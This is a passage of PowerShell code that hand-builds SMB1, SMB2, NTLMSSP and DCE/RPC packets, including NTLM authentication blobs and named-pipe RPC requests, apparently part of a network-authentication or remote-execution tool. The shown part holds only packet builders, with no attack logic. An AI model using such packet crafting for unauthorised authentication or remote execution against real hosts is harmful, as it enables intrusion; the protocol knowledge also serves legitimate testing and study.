    $SMBHeader.Add("MultiplexID",[Byte[]](0x00,0x00))

    return $SMBHeader
}
function New-PacketSMBNegotiateProtocolRequest
{
    param([String]$Version)

    if($Version -eq 'SMB1')
    {
        [Byte[]]$byte_count = 0x0c,0x00
    }
    else
    {
        [Byte[]]$byte_count = 0x22,0x00  
    }

    $SMBNegotiateProtocolRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBNegotiateProtocolRequest.Add("WordCount",[Byte[]](0x00))
    $SMBNegotiateProtocolRequest.Add("ByteCount",$byte_count)
    $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_BufferFormat",[Byte[]](0x02))
    $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_Name",[Byte[]](0x4e,0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00))

    if($version -ne 'SMB1')
    {
        $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_BufferFormat2",[Byte[]](0x02))
        $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_Name2",[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x30,0x30,0x32,0x00))
        $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_BufferFormat3",[Byte[]](0x02))
        $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_Name3",[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x3f,0x3f,0x3f,0x00))
    }

    return $SMBNegotiateProtocolRequest
}

function New-PacketSMBSessionSetupAndXRequest
{
    param([Byte[]]$SecurityBlob)

    [Byte[]]$byte_count = [System.BitConverter]::GetBytes($SecurityBlob.Length)[0,1]
    [Byte[]]$security_blob_length = [System.BitConverter]::GetBytes($SecurityBlob.Length + 5)[0,1]

    $SMBSessionSetupAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBSessionSetupAndXRequest.Add("WordCount",[Byte[]](0x0c))
    $SMBSessionSetupAndXRequest.Add("AndXCommand",[Byte[]](0xff))
    $SMBSessionSetupAndXRequest.Add("Reserved",[Byte[]](0x00))
    $SMBSessionSetupAndXRequest.Add("AndXOffset",[Byte[]](0x00,0x00))
    $SMBSessionSetupAndXRequest.Add("MaxBuffer",[Byte[]](0xff,0xff))
    $SMBSessionSetupAndXRequest.Add("MaxMpxCount",[Byte[]](0x02,0x00))
    $SMBSessionSetupAndXRequest.Add("VCNumber",[Byte[]](0x01,0x00))
    $SMBSessionSetupAndXRequest.Add("SessionKey",[Byte[]](0x00,0x00,0x00,0x00))
    $SMBSessionSetupAndXRequest.Add("SecurityBlobLength",$byte_count)
    $SMBSessionSetupAndXRequest.Add("Reserved2",[Byte[]](0x00,0x00,0x00,0x00))
    $SMBSessionSetupAndXRequest.Add("Capabilities",[Byte[]](0x44,0x00,0x00,0x80))
    $SMBSessionSetupAndXRequest.Add("ByteCount",$security_blob_length)
    $SMBSessionSetupAndXRequest.Add("SecurityBlob",$SecurityBlob)
    $SMBSessionSetupAndXRequest.Add("NativeOS",[Byte[]](0x00,0x00,0x00))
    $SMBSessionSetupAndXRequest.Add("NativeLANManage",[Byte[]](0x00,0x00))

    return $SMBSessionSetupAndXRequest 
}

function New-PacketSMBTreeConnectAndXRequest
{
    param([Byte[]]$Path)

    [Byte[]]$path_length = $([System.BitConverter]::GetBytes($Path.Length + 7))[0,1]

    $SMBTreeConnectAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBTreeConnectAndXRequest.Add("WordCount",[Byte[]](0x04))
    $SMBTreeConnectAndXRequest.Add("AndXCommand",[Byte[]](0xff))
    $SMBTreeConnectAndXRequest.Add("Reserved",[Byte[]](0x00))
    $SMBTreeConnectAndXRequest.Add("AndXOffset",[Byte[]](0x00,0x00))
    $SMBTreeConnectAndXRequest.Add("Flags",[Byte[]](0x00,0x00))
    $SMBTreeConnectAndXRequest.Add("PasswordLength",[Byte[]](0x01,0x00))
    $SMBTreeConnectAndXRequest.Add("ByteCount",$path_length)
    $SMBTreeConnectAndXRequest.Add("Password",[Byte[]](0x00))
    $SMBTreeConnectAndXRequest.Add("Tree",$Path)
    $SMBTreeConnectAndXRequest.Add("Service",[Byte[]](0x3f,0x3f,0x3f,0x3f,0x3f,0x00))

    return $SMBTreeConnectAndXRequest
}

function New-PacketSMBNTCreateAndXRequest
{
    param([Byte[]]$NamedPipe)

    [Byte[]]$named_pipe_length = $([System.BitConverter]::GetBytes($NamedPipe.Length))[0,1]
    [Byte[]]$file_name_length = $([System.BitConverter]::GetBytes($NamedPipe.Length - 1))[0,1]

    $SMBNTCreateAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBNTCreateAndXRequest.Add("WordCount",[Byte[]](0x18))
    $SMBNTCreateAndXRequest.Add("AndXCommand",[Byte[]](0xff))
    $SMBNTCreateAndXRequest.Add("Reserved",[Byte[]](0x00))
    $SMBNTCreateAndXRequest.Add("AndXOffset",[Byte[]](0x00,0x00))
    $SMBNTCreateAndXRequest.Add("Reserved2",[Byte[]](0x00))
    $SMBNTCreateAndXRequest.Add("FileNameLen",$file_name_length)
    $SMBNTCreateAndXRequest.Add("CreateFlags",[Byte[]](0x16,0x00,0x00,0x00))
    $SMBNTCreateAndXRequest.Add("RootFID",[Byte[]](0x00,0x00,0x00,0x00))
    $SMBNTCreateAndXRequest.Add("AccessMask",[Byte[]](0x00,0x00,0x00,0x02))
    $SMBNTCreateAndXRequest.Add("AllocationSize",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMBNTCreateAndXRequest.Add("FileAttributes",[Byte[]](0x00,0x00,0x00,0x00))
    $SMBNTCreateAndXRequest.Add("ShareAccess",[Byte[]](0x07,0x00,0x00,0x00))
    $SMBNTCreateAndXRequest.Add("Disposition",[Byte[]](0x01,0x00,0x00,0x00))
    $SMBNTCreateAndXRequest.Add("CreateOptions",[Byte[]](0x00,0x00,0x00,0x00))
    $SMBNTCreateAndXRequest.Add("Impersonation",[Byte[]](0x02,0x00,0x00,0x00))
    $SMBNTCreateAndXRequest.Add("SecurityFlags",[Byte[]](0x00))
    $SMBNTCreateAndXRequest.Add("ByteCount",$named_pipe_length)
    $SMBNTCreateAndXRequest.Add("Filename",$NamedPipe)

    return $SMBNTCreateAndXRequest
}

function New-PacketSMBReadAndXRequest
{
    $SMBReadAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBReadAndXRequest.Add("WordCount",[Byte[]](0x0a))
    $SMBReadAndXRequest.Add("AndXCommand",[Byte[]](0xff))
    $SMBReadAndXRequest.Add("Reserved",[Byte[]](0x00))
    $SMBReadAndXRequest.Add("AndXOffset",[Byte[]](0x00,0x00))
    $SMBReadAndXRequest.Add("FID",[Byte[]](0x00,0x40))
    $SMBReadAndXRequest.Add("Offset",[Byte[]](0x00,0x00,0x00,0x00))
    $SMBReadAndXRequest.Add("MaxCountLow",[Byte[]](0x58,0x02))
    $SMBReadAndXRequest.Add("MinCount",[Byte[]](0x58,0x02))
    $SMBReadAndXRequest.Add("Unknown",[Byte[]](0xff,0xff,0xff,0xff))
    $SMBReadAndXRequest.Add("Remaining",[Byte[]](0x00,0x00))
    $SMBReadAndXRequest.Add("ByteCount",[Byte[]](0x00,0x00))

    return $SMBReadAndXRequest
}

function New-PacketSMBWriteAndXRequest
{
    param([Byte[]]$FileID,[Int]$Length)

    [Byte[]]$write_length = [System.BitConverter]::GetBytes($Length)[0,1]

    $SMBWriteAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBWriteAndXRequest.Add("WordCount",[Byte[]](0x0e))
    $SMBWriteAndXRequest.Add("AndXCommand",[Byte[]](0xff))
    $SMBWriteAndXRequest.Add("Reserved",[Byte[]](0x00))
    $SMBWriteAndXRequest.Add("AndXOffset",[Byte[]](0x00,0x00))
    $SMBWriteAndXRequest.Add("FID",$FileID)
    $SMBWriteAndXRequest.Add("Offset",[Byte[]](0xea,0x03,0x00,0x00))
    $SMBWriteAndXRequest.Add("Reserved2",[Byte[]](0xff,0xff,0xff,0xff))
    $SMBWriteAndXRequest.Add("WriteMode",[Byte[]](0x08,0x00))
    $SMBWriteAndXRequest.Add("Remaining",$write_length)
    $SMBWriteAndXRequest.Add("DataLengthHigh",[Byte[]](0x00,0x00))
    $SMBWriteAndXRequest.Add("DataLengthLow",$write_length)
    $SMBWriteAndXRequest.Add("DataOffset",[Byte[]](0x3f,0x00))
    $SMBWriteAndXRequest.Add("HighOffset",[Byte[]](0x00,0x00,0x00,0x00))
    $SMBWriteAndXRequest.Add("ByteCount",$write_length)

    return $SMBWriteAndXRequest
}

function New-PacketSMBCloseRequest
{
    param ([Byte[]]$FileID)

    $SMBCloseRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBCloseRequest.Add("WordCount",[Byte[]](0x03))
    $SMBCloseRequest.Add("FID",$FileID)
    $SMBCloseRequest.Add("LastWrite",[Byte[]](0xff,0xff,0xff,0xff))
    $SMBCloseRequest.Add("ByteCount",[Byte[]](0x00,0x00))

    return $SMBCloseRequest
}

function New-PacketSMBTreeDisconnectRequest
{
    $SMBTreeDisconnectRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBTreeDisconnectRequest.Add("WordCount",[Byte[]](0x00))
    $SMBTreeDisconnectRequest.Add("ByteCount",[Byte[]](0x00,0x00))

    return $SMBTreeDisconnectRequest
}

function New-PacketSMBLogoffAndXRequest
{
    $SMBLogoffAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBLogoffAndXRequest.Add("WordCount",[Byte[]](0x02))
    $SMBLogoffAndXRequest.Add("AndXCommand",[Byte[]](0xff))
    $SMBLogoffAndXRequest.Add("Reserved",[Byte[]](0x00))
    $SMBLogoffAndXRequest.Add("AndXOffset",[Byte[]](0x00,0x00))
    $SMBLogoffAndXRequest.Add("ByteCount",[Byte[]](0x00,0x00))

    return $SMBLogoffAndXRequest
}

#SMB2

function New-PacketSMB2Header
{
    param([Byte[]]$Command,[Byte[]]$CreditRequest,[Bool]$Signing,[Int]$MessageID,[Byte[]]$ProcessID,[Byte[]]$TreeID,[Byte[]]$SessionID)

    if($Signing)
    {
        $flags = 0x08,0x00,0x00,0x00      
    }
    else
    {
        $flags = 0x00,0x00,0x00,0x00
    }

    [Byte[]]$message_ID = [System.BitConverter]::GetBytes($MessageID)

    if($message_ID.Length -eq 4)
    {
        $message_ID += 0x00,0x00,0x00,0x00
    }

    $SMB2Header = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2Header.Add("ProtocolID",[Byte[]](0xfe,0x53,0x4d,0x42))
    $SMB2Header.Add("StructureSize",[Byte[]](0x40,0x00))
    $SMB2Header.Add("CreditCharge",[Byte[]](0x01,0x00))
    $SMB2Header.Add("ChannelSequence",[Byte[]](0x00,0x00))
    $SMB2Header.Add("Reserved",[Byte[]](0x00,0x00))
    $SMB2Header.Add("Command",$Command)
    $SMB2Header.Add("CreditRequest",$CreditRequest)
    $SMB2Header.Add("Flags",$flags)
    $SMB2Header.Add("NextCommand",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2Header.Add("MessageID",$message_ID)
    $SMB2Header.Add("ProcessID",$ProcessID)
    $SMB2Header.Add("TreeID",$TreeID)
    $SMB2Header.Add("SessionID",$SessionID)
    $SMB2Header.Add("Signature",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    return $SMB2Header
}

function New-PacketSMB2NegotiateProtocolRequest
{
    $SMB2NegotiateProtocolRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2NegotiateProtocolRequest.Add("StructureSize",[Byte[]](0x24,0x00))
    $SMB2NegotiateProtocolRequest.Add("DialectCount",[Byte[]](0x02,0x00))
    $SMB2NegotiateProtocolRequest.Add("SecurityMode",[Byte[]](0x01,0x00))
    $SMB2NegotiateProtocolRequest.Add("Reserved",[Byte[]](0x00,0x00))
    $SMB2NegotiateProtocolRequest.Add("Capabilities",[Byte[]](0x40,0x00,0x00,0x00))
    $SMB2NegotiateProtocolRequest.Add("ClientGUID",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMB2NegotiateProtocolRequest.Add("NegotiateContextOffset",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2NegotiateProtocolRequest.Add("NegotiateContextCount",[Byte[]](0x00,0x00))
    $SMB2NegotiateProtocolRequest.Add("Reserved2",[Byte[]](0x00,0x00))
    $SMB2NegotiateProtocolRequest.Add("Dialect",[Byte[]](0x02,0x02))
    $SMB2NegotiateProtocolRequest.Add("Dialect2",[Byte[]](0x10,0x02))

    return $SMB2NegotiateProtocolRequest
}

function New-PacketSMB2SessionSetupRequest
{
    param([Byte[]]$SecurityBlob)

    [Byte[]]$security_buffer_length = ([System.BitConverter]::GetBytes($SecurityBlob.Length))[0,1]

    $SMB2SessionSetupRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2SessionSetupRequest.Add("StructureSize",[Byte[]](0x19,0x00))
    $SMB2SessionSetupRequest.Add("Flags",[Byte[]](0x00))
    $SMB2SessionSetupRequest.Add("SecurityMode",[Byte[]](0x01))
    $SMB2SessionSetupRequest.Add("Capabilities",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2SessionSetupRequest.Add("Channel",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2SessionSetupRequest.Add("SecurityBufferOffset",[Byte[]](0x58,0x00))
    $SMB2SessionSetupRequest.Add("SecurityBufferLength",$security_buffer_length)
    $SMB2SessionSetupRequest.Add("PreviousSessionID",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMB2SessionSetupRequest.Add("Buffer",$SecurityBlob)

    return $SMB2SessionSetupRequest 
}

function New-PacketSMB2TreeConnectRequest
{
    param([Byte[]]$Buffer)

    [Byte[]]$path_length = ([System.BitConverter]::GetBytes($Buffer.Length))[0,1]

    $SMB2TreeConnectRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2TreeConnectRequest.Add("StructureSize",[Byte[]](0x09,0x00))
    $SMB2TreeConnectRequest.Add("Reserved",[Byte[]](0x00,0x00))
    $SMB2TreeConnectRequest.Add("PathOffset",[Byte[]](0x48,0x00))
    $SMB2TreeConnectRequest.Add("PathLength",$path_length)
    $SMB2TreeConnectRequest.Add("Buffer",$Buffer)

    return $SMB2TreeConnectRequest
}

function New-PacketSMB2CreateRequestFile
{
    param([Byte[]]$NamedPipe)

    $name_length = ([System.BitConverter]::GetBytes($NamedPipe.Length))[0,1]

    $SMB2CreateRequestFile = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2CreateRequestFile.Add("StructureSize",[Byte[]](0x39,0x00))
    $SMB2CreateRequestFile.Add("Flags",[Byte[]](0x00))
    $SMB2CreateRequestFile.Add("RequestedOplockLevel",[Byte[]](0x00))
    $SMB2CreateRequestFile.Add("Impersonation",[Byte[]](0x02,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("SMBCreateFlags",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("Reserved",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("DesiredAccess",[Byte[]](0x03,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("FileAttributes",[Byte[]](0x80,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("ShareAccess",[Byte[]](0x01,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("CreateDisposition",[Byte[]](0x01,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("CreateOptions",[Byte[]](0x40,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("NameOffset",[Byte[]](0x78,0x00))
    $SMB2CreateRequestFile.Add("NameLength",$name_length)
    $SMB2CreateRequestFile.Add("CreateContextsOffset",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("CreateContextsLength",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("Buffer",$NamedPipe)

    return $SMB2CreateRequestFile
}

function New-PacketSMB2ReadRequest
{
    param ([Byte[]]$FileID)

    $SMB2ReadRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2ReadRequest.Add("StructureSize",[Byte[]](0x31,0x00))
    $SMB2ReadRequest.Add("Padding",[Byte[]](0x50))
    $SMB2ReadRequest.Add("Flags",[Byte[]](0x00))
    $SMB2ReadRequest.Add("Length",[Byte[]](0x00,0x00,0x10,0x00))
    $SMB2ReadRequest.Add("Offset",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMB2ReadRequest.Add("FileID",$FileID)
    $SMB2ReadRequest.Add("MinimumCount",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2ReadRequest.Add("Channel",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2ReadRequest.Add("RemainingBytes",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2ReadRequest.Add("ReadChannelInfoOffset",[Byte[]](0x00,0x00))
    $SMB2ReadRequest.Add("ReadChannelInfoLength",[Byte[]](0x00,0x00))
    $SMB2ReadRequest.Add("Buffer",[Byte[]](0x30))

    return $SMB2ReadRequest
}

function New-PacketSMB2WriteRequest
{
    param([Byte[]]$FileID,[Int]$RPCLength)

    [Byte[]]$write_length = [System.BitConverter]::GetBytes($RPCLength)

    $SMB2WriteRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2WriteRequest.Add("StructureSize",[Byte[]](0x31,0x00))
    $SMB2WriteRequest.Add("DataOffset",[Byte[]](0x70,0x00))
    $SMB2WriteRequest.Add("Length",$write_length)
    $SMB2WriteRequest.Add("Offset",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMB2WriteRequest.Add("FileID",$FileID)
    $SMB2WriteRequest.Add("Channel",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2WriteRequest.Add("RemainingBytes",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2WriteRequest.Add("WriteChannelInfoOffset",[Byte[]](0x00,0x00))
    $SMB2WriteRequest.Add("WriteChannelInfoLength",[Byte[]](0x00,0x00))
    $SMB2WriteRequest.Add("Flags",[Byte[]](0x00,0x00,0x00,0x00))

    return $SMB2WriteRequest
}

function New-PacketSMB2CloseRequest
{
    param ([Byte[]]$FileID)

    $SMB2CloseRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2CloseRequest.Add("StructureSize",[Byte[]](0x18,0x00))
    $SMB2CloseRequest.Add("Flags",[Byte[]](0x00,0x00))
    $SMB2CloseRequest.Add("Reserved",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2CloseRequest.Add("FileID",$FileID)

    return $SMB2CloseRequest
}

function New-PacketSMB2TreeDisconnectRequest
{
    $SMB2TreeDisconnectRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2TreeDisconnectRequest.Add("StructureSize",[Byte[]](0x04,0x00))
    $SMB2TreeDisconnectRequest.Add("Reserved",[Byte[]](0x00,0x00))

    return $SMB2TreeDisconnectRequest
}

function New-PacketSMB2SessionLogoffRequest
{
    $SMB2SessionLogoffRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2SessionLogoffRequest.Add("StructureSize",[Byte[]](0x04,0x00))
    $SMB2SessionLogoffRequest.Add("Reserved",[Byte[]](0x00,0x00))

    return $SMB2SessionLogoffRequest
}

#NTLM

function New-PacketNTLMSSPNegotiate
{
    param([Byte[]]$NegotiateFlags,[Byte[]]$Version)

    [Byte[]]$NTLMSSP_length = ([System.BitConverter]::GetBytes($Version.Length + 32))[0]
    [Byte[]]$ASN_length_1 = $NTLMSSP_length[0] + 32
    [Byte[]]$ASN_length_2 = $NTLMSSP_length[0] + 22
    [Byte[]]$ASN_length_3 = $NTLMSSP_length[0] + 20
    [Byte[]]$ASN_length_4 = $NTLMSSP_length[0] + 2

    $NTLMSSPNegotiate = New-Object System.Collections.Specialized.OrderedDictionary
    $NTLMSSPNegotiate.Add("InitialContextTokenID",[Byte[]](0x60))
    $NTLMSSPNegotiate.Add("InitialcontextTokenLength",$ASN_length_1)
    $NTLMSSPNegotiate.Add("ThisMechID",[Byte[]](0x06))
    $NTLMSSPNegotiate.Add("ThisMechLength",[Byte[]](0x06))
    $NTLMSSPNegotiate.Add("OID",[Byte[]](0x2b,0x06,0x01,0x05,0x05,0x02))
    $NTLMSSPNegotiate.Add("InnerContextTokenID",[Byte[]](0xa0))
    $NTLMSSPNegotiate.Add("InnerContextTokenLength",$ASN_length_2)
    $NTLMSSPNegotiate.Add("InnerContextTokenID2",[Byte[]](0x30))
    $NTLMSSPNegotiate.Add("InnerContextTokenLength2",$ASN_length_3)
    $NTLMSSPNegotiate.Add("MechTypesID",[Byte[]](0xa0))
    $NTLMSSPNegotiate.Add("MechTypesLength",[Byte[]](0x0e))
    $NTLMSSPNegotiate.Add("MechTypesID2",[Byte[]](0x30))
    $NTLMSSPNegotiate.Add("MechTypesLength2",[Byte[]](0x0c))
    $NTLMSSPNegotiate.Add("MechTypesID3",[Byte[]](0x06))
    $NTLMSSPNegotiate.Add("MechTypesLength3",[Byte[]](0x0a))
    $NTLMSSPNegotiate.Add("MechType",[Byte[]](0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a))
    $NTLMSSPNegotiate.Add("MechTokenID",[Byte[]](0xa2))
    $NTLMSSPNegotiate.Add("MechTokenLength",$ASN_length_4)
    $NTLMSSPNegotiate.Add("NTLMSSPID",[Byte[]](0x04))
    $NTLMSSPNegotiate.Add("NTLMSSPLength",$NTLMSSP_length)
    $NTLMSSPNegotiate.Add("Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
    $NTLMSSPNegotiate.Add("MessageType",[Byte[]](0x01,0x00,0x00,0x00))
    $NTLMSSPNegotiate.Add("NegotiateFlags",$NegotiateFlags)
    $NTLMSSPNegotiate.Add("CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $NTLMSSPNegotiate.Add("CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    if($Version)
    {
        $NTLMSSPNegotiate.Add("Version",$Version)
    }

    return $NTLMSSPNegotiate
}

function New-PacketNTLMSSPAuth
{
    param([Byte[]]$NTLMResponse)

    [Byte[]]$NTLMSSP_length = ([System.BitConverter]::GetBytes($NTLMResponse.Length))[1,0]
    [Byte[]]$ASN_length_1 = ([System.BitConverter]::GetBytes($NTLMResponse.Length + 12))[1,0]
    [Byte[]]$ASN_length_2 = ([System.BitConverter]::GetBytes($NTLMResponse.Length + 8))[1,0]
    [Byte[]]$ASN_length_3 = ([System.BitConverter]::GetBytes($NTLMResponse.Length + 4))[1,0]

    $NTLMSSPAuth = New-Object System.Collections.Specialized.OrderedDictionary
    $NTLMSSPAuth.Add("ASNID",[Byte[]](0xa1,0x82))
    $NTLMSSPAuth.Add("ASNLength",$ASN_length_1)
    $NTLMSSPAuth.Add("ASNID2",[Byte[]](0x30,0x82))
    $NTLMSSPAuth.Add("ASNLength2",$ASN_length_2)
    $NTLMSSPAuth.Add("ASNID3",[Byte[]](0xa2,0x82))
    $NTLMSSPAuth.Add("ASNLength3",$ASN_length_3)
    $NTLMSSPAuth.Add("NTLMSSPID",[Byte[]](0x04,0x82))
    $NTLMSSPAuth.Add("NTLMSSPLength",$NTLMSSP_length)
    $NTLMSSPAuth.Add("NTLMResponse",$NTLMResponse)

    return $NTLMSSPAuth
}

#RPC

function New-PacketRPCBind
{
    param([Byte[]]$FragLength,[Int]$CallID,[Byte[]]$NumCtxItems,[Byte[]]$ContextID,[Byte[]]$UUID,[Byte[]]$UUIDVersion)

    [Byte[]]$call_ID = [System.BitConverter]::GetBytes($CallID)

    $RPCBind = New-Object System.Collections.Specialized.OrderedDictionary
    $RPCBind.Add("Version",[Byte[]](0x05))
    $RPCBind.Add("VersionMinor",[Byte[]](0x00))
    $RPCBind.Add("PacketType",[Byte[]](0x0b))
    $RPCBind.Add("PacketFlags",[Byte[]](0x03))
    $RPCBind.Add("DataRepresentation",[Byte[]](0x10,0x00,0x00,0x00))
    $RPCBind.Add("FragLength",$FragLength)
    $RPCBind.Add("AuthLength",[Byte[]](0x00,0x00))
    $RPCBind.Add("CallID",$call_ID)
    $RPCBind.Add("MaxXmitFrag",[Byte[]](0xb8,0x10))
    $RPCBind.Add("MaxRecvFrag",[Byte[]](0xb8,0x10))
    $RPCBind.Add("AssocGroup",[Byte[]](0x00,0x00,0x00,0x00))
    $RPCBind.Add("NumCtxItems",$NumCtxItems)
    $RPCBind.Add("Unknown",[Byte[]](0x00,0x00,0x00))
    $RPCBind.Add("ContextID",$ContextID)
    $RPCBind.Add("NumTransItems",[Byte[]](0x01))
    $RPCBind.Add("Unknown2",[Byte[]](0x00))
    $RPCBind.Add("Interface",$UUID)
    $RPCBind.Add("InterfaceVer",$UUIDVersion)
    $RPCBind.Add("InterfaceVerMinor",[Byte[]](0x00,0x00))
    $RPCBind.Add("TransferSyntax",[Byte[]](0x04,0x5d,0x88,0x8a,0xeb,0x1c,0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60))
    $RPCBind.Add("TransferSyntaxVer",[Byte[]](0x02,0x00,0x00,0x00))

    if($NumCtxItems[0] -eq 2)
    {
        $RPCBind.Add("ContextID2",[Byte[]](0x01,0x00))
        $RPCBind.Add("NumTransItems2",[Byte[]](0x01))
        $RPCBind.Add("Unknown3",[Byte[]](0x00))
        $RPCBind.Add("Interface2",$UUID)
        $RPCBind.Add("InterfaceVer2",$UUIDVersion)
        $RPCBind.Add("InterfaceVerMinor2",[Byte[]](0x00,0x00))
        $RPCBind.Add("TransferSyntax2",[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $RPCBind.Add("TransferSyntaxVer2",[Byte[]](0x01,0x00,0x00,0x00))
    }
    elseif($NumCtxItems[0] -eq 3)
    {
        $RPCBind.Add("ContextID2",[Byte[]](0x01,0x00))
        $RPCBind.Add("NumTransItems2",[Byte[]](0x01))
        $RPCBind.Add("Unknown3",[Byte[]](0x00))
        $RPCBind.Add("Interface2",$UUID)
        $RPCBind.Add("InterfaceVer2",$UUIDVersion)
        $RPCBind.Add("InterfaceVerMinor2",[Byte[]](0x00,0x00))
        $RPCBind.Add("TransferSyntax2",[Byte[]](0x33,0x05,0x71,0x71,0xba,0xbe,0x37,0x49,0x83,0x19,0xb5,0xdb,0xef,0x9c,0xcc,0x36))
        $RPCBind.Add("TransferSyntaxVer2",[Byte[]](0x01,0x00,0x00,0x00))
        $RPCBind.Add("ContextID3",[Byte[]](0x02,0x00))
        $RPCBind.Add("NumTransItems3",[Byte[]](0x01))
        $RPCBind.Add("Unknown4",[Byte[]](0x00))
        $RPCBind.Add("Interface3",$UUID)
        $RPCBind.Add("InterfaceVer3",$UUIDVersion)
        $RPCBind.Add("InterfaceVerMinor3",[Byte[]](0x00,0x00))
        $RPCBind.Add("TransferSyntax3",[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $RPCBind.Add("TransferSyntaxVer3",[Byte[]](0x01,0x00,0x00,0x00))
    }

    if($call_ID -eq 3)
    {
        $RPCBind.Add("AuthType",[Byte[]](0x0a))
        $RPCBind.Add("AuthLevel",[Byte[]](0x02))
        $RPCBind.Add("AuthPadLength",[Byte[]](0x00))
        $RPCBind.Add("AuthReserved",[Byte[]](0x00))
        $RPCBind.Add("ContextID3",[Byte[]](0x00,0x00,0x00,0x00))
        $RPCBind.Add("Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
        $RPCBind.Add("MessageType",[Byte[]](0x01,0x00,0x00,0x00))
        $RPCBind.Add("NegotiateFlags",[Byte[]](0x97,0x82,0x08,0xe2))
        $RPCBind.Add("CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $RPCBind.Add("CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $RPCBind.Add("OSVersion",[Byte[]](0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f))
    }

    return $RPCBind
}

function New-PacketRPCRequest
{
    param([Byte[]]$Flags,[Int]$ServiceLength,[Int]$AuthLength,[Int]$AuthPadding,[Byte[]]$CallID,[Byte[]]$ContextID,[Byte[]]$Opnum,[Byte[]]$Data)

    if($AuthLength -gt 0)
    {
        $full_auth_length = $AuthLength + $AuthPadding + 8
    }

    [Byte[]]$write_length = [System.BitConverter]::GetBytes($ServiceLength + 24 + $full_auth_length + $Data.Length)
    [Byte[]]$frag_length = $write_length[0,1]
    [Byte[]]$alloc_hint = [System.BitConverter]::GetBytes($ServiceLength + $Data.Length)
    [Byte[]]$auth_length = ([System.BitConverter]::GetBytes($AuthLength))[0,1]

    $RPCRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $RPCRequest.Add("Version",[Byte[]](0x05))
    $RPCRequest.Add("VersionMinor",[Byte[]](0x00))
    $RPCRequest.Add("PacketType",[Byte[]](0x00))
    $RPCRequest.Add("PacketFlags",$Flags)
    $RPCRequest.Add("DataRepresentation",[Byte[]](0x10,0x00,0x00,0x00))
    $RPCRequest.Add("FragLength",$frag_length)
